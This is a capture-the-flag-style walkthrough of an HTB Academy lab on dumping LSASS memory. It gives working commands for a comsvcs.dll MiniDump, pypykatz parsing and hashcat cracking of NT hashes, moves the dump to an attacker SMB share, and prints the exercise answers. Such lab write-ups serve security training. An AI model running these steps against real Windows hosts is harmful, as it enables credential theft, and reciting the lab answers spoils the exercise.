### CPTS / HTB Penetration Tester Path <br>
### Password Attacks - Attacking LSASS <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Attacking LSASS



LSASS caches active session creds in memory — dumping the process gives NT hashes, Kerberos keys, WDIGEST cleartext (legacy systems), DPAPI master keys.

#### Method 1 — Task Manager dump (GUI)

1. Open Task Manager → `Processes`
2. Right-click `Local Security Authority Process` → `Create dump file`
3. Output saved to `%temp%\lsass.DMP`

#### Method 2 — rundll32 + comsvcs.dll (CLI, AV-flagged)

Find LSASS PID:

```diff
+ C:\> tasklist /svc
```

<br>

Or via PowerShell:

```diff
+ PS C:\> Get-Process lsass
```

<br>

Create the dump (elevated PowerShell):

```diff
+ PS C:\> rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

<br>

#### Parse with Pypykatz (Linux-friendly mimikatz reimplementation)

```diff
+ $ pypykatz lsa minidump /home/<user>/Documents/lsass.dmp
```

<br>

Output sections:

| Section | Contains |
|---|---|
| `MSV` | Username, Domain, NT hash, SHA1 |
| `WDIGEST` | Cleartext password (legacy / WDIGEST enabled) |
| `Kerberos` | Tickets, keys, PINs |
| `DPAPI` | masterkey + GUID for decrypting DPAPI blobs |

Crack any captured NT hashes:

```diff
+ $ sudo hashcat -m 1000 <ntlm_hash> /usr/share/wordlists/rockyou.txt
```

<br>

---

<br>

### Exercise

IP: 10.129.202.149

---

### Question 1:
What is the name of the executable file associated with the Local Security Authority Process?

&#x1F6A9; found **lsass.exe**.

---

### Question 2:
Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer. (Format: Case sensitive)

```diff
+ $ xfreerdp /v:10.129.202.149 /u:htb-student /p:HTB_@cademy_stdnt!
```

<br>

In the RDP session, hit `Ctrl+Alt+End` for taskmanager, find `Local Security Authority Process`, right-click → `Create dump file`. Output:

	C:\Users\HTB-ST~1\AppData\Local\Temp\lsass.DMP

Stand up SMB share on attack box:

```diff
+ $ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support susshare /home/htb-ac-830862/Documents
```

<br>

Move dump to share:

```diff
+ C:\Users\htb-student\Desktop>move lsass.DMP \\10.10.15.16\susshare
```

<br>

Parse with pypykatz:

```diff
+ $ pypykatz lsa minidump lsass.DMP
```

	== LogonSession ==
	username Vendor
	domainname FS01
		== MSV ==
			NT: 31f87811133bc6aaa75a536e77f64314

<br>

Crack the Vendor NT hash:

```diff
+ $ sudo hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 /mnt/SSD_DATA/SecLists/rockyou.txt
```

	31f87811133bc6aaa75a536e77f64314:Mic@123

&#x1F6A9; found **Mic--edit--@123**.
